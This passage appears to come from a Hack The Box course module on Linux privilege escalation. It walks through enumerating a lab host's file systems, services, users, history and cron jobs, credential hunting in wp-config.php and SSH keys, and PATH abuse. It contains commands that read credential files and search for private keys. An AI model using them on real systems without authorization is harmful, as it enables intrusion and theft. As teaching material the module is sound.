    tmpfs           5,0M  4,0K  5,0M   1% /run/lock
    tmpfs           1,9G     0  1,9G   0% /sys/fs/cgroup
    /dev/loop0      128K  128K     0 100% /snap/bare/5
    /dev/loop1       62M   62M     0 100% /snap/core20/1611
    /dev/loop2       92M   92M     0 100% /snap/gtk-common-themes/1535
    /dev/loop4       55M   55M     0 100% /snap/snap-store/558
    /dev/loop3      347M  347M     0 100% /snap/gnome-3-38-2004/115
    /dev/loop5       47M   47M     0 100% /snap/snapd/16292
    /dev/sda1       511M  4,0K  511M   1% /boot/efi
    tmpfs           389M   24K  389M   1% /run/user/1000
    /dev/sr0        3,6G  3,6G     0 100% /media/htb-student/Ubuntu 20.04.5 LTS amd64
    /dev/loop6       50M   50M     0 100% /snap/snapd/17576
    /dev/loop7       64M   64M     0 100% /snap/core20/1695
    /dev/loop8       46M   46M     0 100% /snap/snap-store/599
    /dev/loop9      347M  347M     0 100% /snap/gnome-3-38-2004/119
    

When a file system is unmounted, it is no longer accessible by the system. This can be done for various reasons, such as when a disk is removed, or a file system is no longer needed. Another reason may be that files, scripts, documents, and other important information must not be mounted and viewed by a standard user. Therefore, if we can extend our privileges to the `root` user, we could mount and read these file systems ourselves. Unmounted file systems can be viewed as follows:

#### Unmounted File Systems

    buduboti@htb[/htb]$ cat /etc/fstab | grep -v "#" | column -t
    
    UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
    UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
    /swapfile                                  none       swap  sw                 0  0
    

Many folders and files are kept hidden on a Linux system so they are not obvious, and accidental editing is prevented. Why such files and folders are kept hidden, there are many more reasons than those mentioned so far. Nevertheless, we need to be able to locate all hidden files and folders because they can often contain sensitive information, even if we have read-only permissions.

#### All Hidden Files

    buduboti@htb[/htb]$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
    
    -rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc
    -rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts
    -rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
    -rw-r--r-- 1 htb-student htb-student 807 Nov 27 11:16 /home/htb-student/.profile
    -rw-r--r-- 1 htb-student htb-student 0 Nov 27 11:31 /home/htb-student/.sudo_as_admin_successful
    -rw-r--r-- 1 htb-student htb-student 220 Nov 27 11:16 /home/htb-student/.bash_logout
    -rw-rw-r-- 1 htb-student htb-student 162 Nov 28 13:26 /home/htb-student/.notes
    

#### All Hidden Directories

    buduboti@htb[/htb]$ find / -type d -name ".*" -ls 2>/dev/null
    
       684822      4 drwx------   3 htb-student htb-student     4096 Nov 28 12:32 /home/htb-student/.gnupg
       790793      4 drwx------   2 htb-student htb-student     4096 Okt 27 11:31 /home/htb-student/.ssh
       684804      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.cache
       790827      4 drwxrwxr-x   8 htb-student htb-student     4096 Okt 27 11:32 /home/htb-student/CVE-2021-3156/.git
       684796      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.config
       655426      4 drwxr-xr-x   3 htb-student htb-student     4096 Okt 27 11:19 /home/htb-student/.local
       524808      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.cache
       544027      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.config
       544028      4 drwxr-xr-x   3 gdm         gdm             4096 Aug 31 08:54 /var/lib/gdm3/.local
       524938      4 drwx------   2 colord      colord          4096 Okt 27 11:19 /var/lib/colord/.cache
         1408      2 dr-xr-xr-x   1 htb-student htb-student     2048 Aug 31 09:17 /media/htb-student/Ubuntu\ 20.04.5\ LTS\ amd64/.disk
       280101      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.font-unix
       262364      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.ICE-unix
       262362      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.X11-unix
       280103      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.Test-unix
       262830      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.XIM-unix
       661820      4 drwxr-xr-x   5 root        root            4096 Aug 31 08:55 /usr/lib/modules/5.15.0-46-generic/vdso/.build-id
       666709      4 drwxr-xr-x   5 root        root            4096 Okt 27 11:18 /usr/lib/modules/5.15.0-52-generic/vdso/.build-id
       657527      4 drwxr-xr-x 170 root        root            4096 Aug 31 08:55 /usr/lib/debug/.build-id
    

In addition, three default folders are intended for temporary files. These folders are visible to all users and can be read. In addition, temporary logs or script output can be found there. Both `/tmp` and `/var/tmp` are used to store data temporarily. However, the key difference is how long the data is stored in these file systems. The data retention time for `/var/tmp` is much longer than that of the `/tmp` directory. By default, all files and data stored in /var/tmp are retained for up to 30 days. In /tmp, on the other hand, the data is automatically deleted after ten days.

In addition, all temporary files stored in the `/tmp` directory are deleted immediately when the system is restarted. Therefore, the `/var/tmp` directory is used by programs to store data that must be kept between reboots temporarily.

#### Temporary Files

    buduboti@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm
    
    /dev/shm:
    total 0
    
    /tmp:
    total 52
    -rw------- 1 htb-student htb-student    0 Nov 28 12:32 config-err-v8LfEU
    drwx------ 3 root        root        4096 Nov 28 12:37 snap.snap-store
    drwx------ 2 htb-student htb-student 4096 Nov 28 12:32 ssh-OKlLKjlc98xh
    <SNIP>
    drwx------ 2 htb-student htb-student 4096 Nov 28 12:37 tracker-extract-files.1000
    drwx------ 2 gdm         gdm         4096 Nov 28 12:31 tracker-extract-files.125
    
    /var/tmp:
    total 28
    drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-colord.service-RrPcyi
    drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-ModemManager.service-4Rej9e
    ...SNIP...
    

* * *


## Linux Services & Internals Enumeration
* * *


Now that we've dug into the environment and gotten the lay of the land and uncovered as much as possible about our user and group permissions as they relate to files, scripts, binaries, directories, etc., we'll take things one step further and look deeper into the internals of the host operating system. In this phase we will enumerate the following which will help to inform many of the attacks discussed in the later sections of this module.

*   What services and applications are installed?
    
*   What services are running?
    
*   What sockets are in use?
    
*   What users, admins, and groups exist on the system?
    
*   Who is current logged in? What users recently logged in?
    
*   What password policies, if any, are enforced on the host?
    
*   Is the host joined to an Active Directory domain?
    
*   What types of interesting information can we find in history, log, and backup files
    
*   Which files have been modified recently and how often? Are there any interesting patterns in file modification that could indicate a cron job in use that we may be able to hijack?
    
*   Current IP addressing information
    
*   Anything interesting in the `/etc/hosts` file?
    
*   Are there any interesting network connections to other systems in the internal network or even outside the network?
    
*   What tools are installed on the system that we may be able to take advantage of? (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc, etc.)
    
*   Can we access the `bash_history` file for any users and can we uncover any thing interesting from their recorded command line history such as passwords?
    
*   Are any Cron jobs running on the system that we may be able to hijack?
    

At this time we'll also want to gather as much network information as possible. What is our current IP address? Does the system have any other interfaces and, hence, could possibly be used to pivot into another subnet that was previously unreachable from our attack host? We do this with the `ip a` command or `ifconfig`, but this command will sometimes not work on certain systems if the [net-tools](https://packages.ubuntu.com/search?keywords=net-tools) package is not present.

* * *

### Internals

When we talk about the `internals`, we mean the internal configuration and way of working, including integrated processes designed to accomplish specific tasks. So we start with the interfaces through which our target system can communicate.

#### Network Interfaces

    buduboti@htb[/htb]$ ip a
    
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
        link/ether 00:50:56:b9:ed:2a brd ff:ff:ff:ff:ff:ff
        inet 10.129.203.168/16 brd 10.129.255.255 scope global dynamic ens192
           valid_lft 3092sec preferred_lft 3092sec
        inet6 dead:beef::250:56ff:feb9:ed2a/64 scope global dynamic mngtmpaddr 
           valid_lft 86400sec preferred_lft 14400sec
        inet6 fe80::250:56ff:feb9:ed2a/64 scope link 
           valid_lft forever preferred_lft forever
    

Is there anything interesting in the `/etc/hosts` file?

#### Hosts

    buduboti@htb[/htb]$ cat /etc/hosts
    
    127.0.0.1 localhost
    127.0.1.1 nixlpe02
    # The following lines are desirable for IPv6 capable hosts
    ::1     ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    

It can also be helpful to check out each user's last login time to try to see when users typically log in to the system and how frequently. This can give us an idea of how widely used this system is which can open up the potential for more misconfigurations or "messy" directories or command histories.

#### User's Last Login

    buduboti@htb[/htb]$ lastlog
    
    Username         Port     From             Latest
    root                                       **Never logged in**
    daemon                                     **Never logged in**
    bin                                        **Never logged in**
    sys                                        **Never logged in**
    sync                                       **Never logged in**
    ...SNIP...
    systemd-coredump                           **Never logged in**
    mrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022
    lxd                                        **Never logged in**
    bjones                                     **Never logged in**
    administrator.ilfreight                           **Never logged in**
    backupsvc                                  **Never logged in**
    cliff.moore      pts/0    127.0.0.1        Tue Aug  2 19:32:29 +0000 2022
    logger                                     **Never logged in**
    shared                                     **Never logged in**
    stacey.jenkins   pts/0    10.10.14.15      Tue Aug  2 18:29:15 +0000 2022
    htb-student      pts/0    10.10.14.15      Wed Aug  3 13:37:22 +0000 2022                          
    

In addition, let's see if anyone else is currently on the system with us. There are a few ways to do this, such as the `who` command. The `finger` command will work to display this information on some Linux systems. We can see that the `cliff.moore` user is logged in to the system with us.

#### Logged In Users

    buduboti@htb[/htb]$ w
    
     12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
    

It is also important to check a user's bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more. Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.

#### Command History

    buduboti@htb[/htb]$ history
    
        1  id
        2  cd /home/cliff.moore
        3  exit
        4  touch backup.sh
        5  tail /var/log/apache2/error.log
        6  ssh ec2-user@dmz02.inlanefreight.local
        7  history
    

Sometimes we can also find special history files created by scripts or programs. This can be found, among others, in scripts that monitor certain activities of users and check for suspicious activities.

#### Finding History Files

    buduboti@htb[/htb]$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
    
    -rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
    

It's also a good idea to check for any cron jobs on the system. Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.

#### Cron

    buduboti@htb[/htb]$ ls -la /etc/cron.daily/
    
    total 48
    drwxr-xr-x  2 root root 4096 Aug  2 17:36 .
    drwxr-xr-x 96 root root 4096 Aug  2 19:34 ..
    -rwxr-xr-x  1 root root  376 Dec  4  2019 apport
    -rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
    -rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
    -rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
    -rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
    -rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
    -rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
    -rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
    -rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common
    

The [proc filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) (`proc` / `procfs`) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically generated by the kernel. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.

#### Proc

    buduboti@htb[/htb]$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
    
    ...SNIP...
    startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:
    htb-student
    [priv]sshd:
    htb-student
    [priv]/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.ssh/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.sshsshd:
    htb-student@pts/2sshd:
    

* * *

### Services

If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. Therefore, we will see a method to help us detect potentially dangerous packages in a bit. To do this, we first need to create a list of installed packages to work with.

#### Installed Packages

    buduboti@htb[/htb]$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
    
    Listing...                                                 
    accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          
    accountsservice 0.6.55-0ubuntu12~20.04.5                   
    acl 2.2.53-6                                               
    acpi-support 0.143                                         
    acpid 2.0.32-1ubuntu1                                      
    adduser 3.118ubuntu2                                       
    adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 
    alsa-base 1.0.25+dfsg-0ubuntu5                             
    alsa-topology-conf 1.2.2-1                                                                                            
    alsa-ucm-conf 1.2.2-1ubuntu0.13                            
    alsa-utils 1.2.2-1ubuntu2.1                                                                                           
    amd64-microcode 3.20191218.1ubuntu1
    anacron 2.3-29
    apg 2.2.3.dfsg.1-5
    app-install-data-partner 19.04
    apparmor 2.13.3-7ubuntu5.1
    apport-gtk 2.20.11-0ubuntu27.24
    apport-symptoms 0.23
    apport 2.20.11-0ubuntu27.24
    appstream 0.12.10-2
    apt-config-icons-hidpi 0.12.10-2
    apt-config-icons 0.12.10-2
    apt-utils 2.0.9
    ...SNIP...
    

It's also a good idea to check if the `sudo` version installed on the system is vulnerable to any legacy or recent exploits.

#### Sudo Version

    buduboti@htb[/htb]$ sudo -V
    
    Sudo version 1.8.31
    Sudoers policy plugin version 1.8.31
    Sudoers file grammar version 46
    Sudoers I/O plugin version 1.8.31
    

Occasionally it can also happen that no direct packages are installed on the system but compiled programs in the form of binaries. These do not require installation and can be executed directly by the system itself.

#### Binaries

    buduboti@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/
    
    lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -> usr/bin
    
    /usr/bin/:
    total 175160
    -rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled
    -rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec
    -rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect
    -rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen
    -rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository
    -rwxr-xr-x 1 root root       30952 Feb  7  2022  addpart
    lrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -> x86_64-linux-gnu-addr2line
    ...SNIP...
    
    /usr/sbin/:
    total 32500
    -rwxr-xr-x 1 root root      3068 Mai 19  2020 aa-remove-unknown
    -rwxr-xr-x 1 root root      8839 Mai 19  2020 aa-status
    -rwxr-xr-x 1 root root       139 Jun 18  2019 aa-teardown
    -rwxr-xr-x 1 root root     14728 Feb 25  2020 accessdb
    -rwxr-xr-x 1 root root     60432 Nov 28  2019 acpid
    -rwxr-xr-x 1 root root      3075 Jul  4 18:20 addgnupghome
    lrwxrwxrwx 1 root root         7 Okt 27 11:14 addgroup -> adduser
    -rwxr-xr-x 1 root root       860 Dez  7  2019 add-shell
    -rwxr-xr-x 1 root root     37785 Apr 16  2020 adduser
    -rwxr-xr-x 1 root root     69000 Feb  7  2022 agetty
    -rwxr-xr-x 1 root root      5576 Jul 31  2015 alsa
    -rwxr-xr-x 1 root root      4136 Apr 14  2021 alsabat-test
    -rwxr-xr-x 1 root root    118176 Apr 14  2021 alsactl
    -rwxr-xr-x 1 root root     26489 Apr 14  2021 alsa-info
    -rwxr-xr-x 1 root root     39088 Jul 16  2019 anacron
    ...SNIP...
    

[GTFObins](https://gtfobins.github.io) provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate our privileges on the target system. With the next oneliner, we can compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later.

#### GTFObins

    buduboti@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
    
    Check GTFO for: ab                                         
    Check GTFO for: apt                                        
    Check GTFO for: ar                                         
    Check GTFO for: as         
    Check GTFO for: ash                                        
    Check GTFO for: aspell                                     
    Check GTFO for: at     
    Check GTFO for: awk      
    Check GTFO for: bash                                       
    Check GTFO for: bridge
    Check GTFO for: busybox
    Check GTFO for: bzip2
    Check GTFO for: cat
    Check GTFO for: comm
    Check GTFO for: cp
    Check GTFO for: cpio
    Check GTFO for: cupsfilter
    Check GTFO for: curl
    Check GTFO for: dash
    Check GTFO for: date
    Check GTFO for: dd
    Check GTFO for: diff
    

We can use the diagnostic tool `strace` on Linux-based operating systems to track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system. In addition, we can also use the tool to monitor security-related activities and identify potential attack vectors, such as specific requests to remote hosts using passwords or tokens.

The output of `strace` can be written to a file for later analysis, and it provides a wealth of options that allow detailed monitoring of the program's behavior.

#### Trace System Calls

    buduboti@htb[/htb]$ strace ping -c1 10.129.112.20
    
    execve("/usr/bin/ping", ["ping", "-c1", "10.129.112.20"], 0x7ffdc8b96cc0 /* 80 vars */) = 0
    access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
    brk(NULL)                               = 0x56222584c000
    arch_prctl(0x3001 /* ARCH_??? */, 0x7fffb0b2ea00) = -1 EINVAL (Invalid argument)
    ...SNIP...
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    ...SNIP...
    openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY|O_CLOEXEC) = 3
    ...SNIP...
    read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
    pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
    pread64(3, "\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0"..., 48, 848) = 48
    ...SNIP...
    socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3
    socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = 4
    capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, NULL) = 0
    capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=0, permitted=0, inheritable=0}) = 0
    openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY) = 5
    ...SNIP...
    socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5
    connect(5, {sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr("10.129.112.20")}, 16) = 0
    getsockname(5, {sa_family=AF_INET, sin_port=htons(39885), sin_addr=inet_addr("10.129.112.20")}, [16]) = 0
    close(5)                                = 0
    ...SNIP...
    sendto(3, "\10\0\31\303\0\0\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., 64, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("10.129.112.20")}, 16) = 64
    ...SNIP...
    recvmsg(3, {msg_name={sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("10.129.112.20")}, msg_namelen=128 => 16, msg_iov=[{iov_base="\0\0!\300\0\3\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., iov_len=192}], msg_iovlen=1, msg_control=[{cmsg_len=32, cmsg_level=SOL_SOCKET, cmsg_type=SO_TIMESTAMP_OLD, cmsg_data={tv_sec=1675057253, tv_usec=699895}}, {cmsg_len=20, cmsg_level=SOL_IP, cmsg_type=IP_TTL, cmsg_data=[64]}], msg_controllen=56, msg_flags=0}, 0) = 64
    write(1, "64 bytes from 10.129.112.20: icmp_se"..., 57) = 57
    write(1, "\n", 1)                       = 1
    write(1, "--- 10.129.112.20 ping statistics --"..., 34) = 34
    write(1, "1 packets transmitted, 1 receive"..., 60) = 60
    write(1, "rtt min/avg/max/mdev = 0.287/0.2"..., 50) = 50
    close(1)                                = 0
    close(2)                                = 0
    exit_group(0)                           = ?
    +++ exited with 0 +++
    

Users can read almost all configuration files on a Linux operating system if the administrator has kept them the same. These configuration files can often reveal how the service is set up and configured to understand better how we can use it for our purposes. In addition, these files can contain sensitive information, such as keys and paths to files in folders that we cannot see. However, if the file has read permissions for everyone, we can still read the file even if we do not have permission to read the folder.

#### Configuration Files

    buduboti@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
    
    -rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf
    -rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf
    -rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf
    -rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf
    -rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf
    -rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf
    ...SNIP...
    

The scripts are similar to the configuration files. Often administrators are lazy and convinced of network security and neglect the internal security of their systems. These scripts, in some cases, have such wrong privileges that we will deal with later, but the contents are of great importance even without these privileges. Because through them, we can discover internal and individual processes that can be of great use to us.

#### Scripts

    buduboti@htb[/htb]$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
    
    /home/htb-student/automation.sh
    /etc/wpa_supplicant/action_wpa.sh
    /etc/wpa_supplicant/ifupdown.sh
    /etc/wpa_supplicant/functions.sh
    /etc/init.d/keyboard-setup.sh
    /etc/init.d/console-setup.sh
    /etc/init.d/hwclock.sh
    ...SNIP...
    

Also, if we look at the process list, it can give us information about which scripts or binaries are in use and by which user. So, for example, if it is a script created by the administrator in his path and whose rights have not been restricted, we can run it without going into the `root` directory.

#### Running Services by User

    buduboti@htb[/htb]$ ps aux | grep root
    
    ...SNIP...
    root           1  2.0  0.2 168196 11364 ?        Ss   12:31   0:01 /sbin/init splash
    root         378  0.5  0.4  62648 17212 ?        S<s  12:31   0:00 /lib/systemd/systemd-journald
    root         409  0.8  0.1  25208  7832 ?        Ss   12:31   0:00 /lib/systemd/systemd-udevd
    root         457  0.0  0.0 150668   284 ?        Ssl  12:31   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
    root         752  0.0  0.2  58780 10608 ?        Ss   12:31   0:00 /usr/bin/VGAuthService
    root         755  0.0  0.1 248088  7448 ?        Ssl  12:31   0:00 /usr/bin/vmtoolsd
    root         772  0.0  0.2 250528  9388 ?        Ssl  12:31   0:00 /usr/lib/accountsservice/accounts-daemon
    root         773  0.0  0.0   2548   768 ?        Ss   12:31   0:00 /usr/sbin/acpid
    root         774  0.0  0.0  16720   708 ?        Ss   12:31   0:00 /usr/sbin/anacron -d -q -s
    root         778  0.0  0.0  18052  2992 ?        Ss   12:31   0:00 /usr/sbin/cron -f
    root         779  0.0  0.2  37204  8964 ?        Ss   12:31   0:00 /usr/sbin/cupsd -l
    root         784  0.4  0.5 273512 21680 ?        Ssl  12:31   0:00 /usr/sbin/NetworkManager --no-daemon
    root         790  0.0  0.0  81932  3648 ?        Ssl  12:31   0:00 /usr/sbin/irqbalance --foreground
    root         792  0.1  0.5  48244 20540 ?        Ss   12:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
    root         793  1.3  0.2 239180 11832 ?        Ssl  12:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
    root         806  2.1  1.1 1096292 44976 ?       Ssl  12:31   0:01 /usr/lib/snapd/snapd
    root         807  0.0  0.1 244352  6516 ?        Ssl  12:31   0:00 /usr/libexec/switcheroo-control
    root         811  0.1  0.2  17412  8112 ?        Ss   12:31   0:00 /lib/systemd/systemd-logind
    root         817  0.0  0.3 396156 14352 ?        Ssl  12:31   0:00 /usr/lib/udisks2/udisksd
    root         818  0.0  0.1  13684  4876 ?        Ss   12:31   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
    root         871  0.1  0.3 319236 13828 ?        Ssl  12:31   0:00 /usr/sbin/ModemManager
    root         875  0.0  0.3 178392 12748 ?        Ssl  12:31   0:00 /usr/sbin/cups-browsed
    root         889  0.1  0.5 126676 22888 ?        Ssl  12:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
    root         906  0.0  0.2 248244  8736 ?        Ssl  12:31   0:00 /usr/sbin/gdm3
    root        1137  0.0  0.2 252436  9424 ?        Ssl  12:31   0:00 /usr/lib/upower/upowerd
    root        1257  0.0  0.4 293736 16316 ?        Ssl  12:31   0:00 /usr/lib/packagekit/packagekitd
    

* * *


## Credential Hunting
* * *

When enumerating a system, it is important to note down any credentials. These may be found in configuration files (`.conf`, `.config`, `.xml`, etc.), shell scripts, a user's bash history file, backup (`.bak`) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.

The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files:

    htb_student@NIX02:~$ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
    
    define( 'DB_USER', 'wordpressuser' );
    define( 'DB_PASSWORD', 'WPadmin123!' );
    

The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).

    htb_student@NIX02:~$  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
    
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /etc/python3/debian_config
    /etc/kbd/config
    /etc/manpath.config
    /boot/config-4.4.0-116-generic
    /boot/grub/i386-pc/configfile.mod
    /sys/devices/pci0000:00/0000:00:00.0/config
    /sys/devices/pci0000:00/0000:00:01.0/config
    <SNIP>
    

* * *

### SSH Keys

It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the `known_hosts` file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.

    htb_student@NIX02:~$  ls ~/.ssh
    
    id_rsa  id_rsa.pub  known_hosts
    


## Path Abuse

* * *

[PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat /tmp/test.txt`. We can check the contents of the PATH variable by typing `env | grep PATH` or `echo $PATH`.

    htb_student@NIX02:~$ echo $PATH
    
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    

Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

    htb_student@NIX02:~$ pwd && conncheck 
    
    /usr/local/sbin
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
    tcp        0     88 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
    tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
    tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2    
    

As shown below, the `conncheck` script created in `/usr/local/sbin` will still run when in the `/tmp` directory because it was created in a directory specified in the PATH.

    htb_student@NIX02:~$ pwd && conncheck 
    
    /tmp
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
    tcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
    tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
    tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2     
    

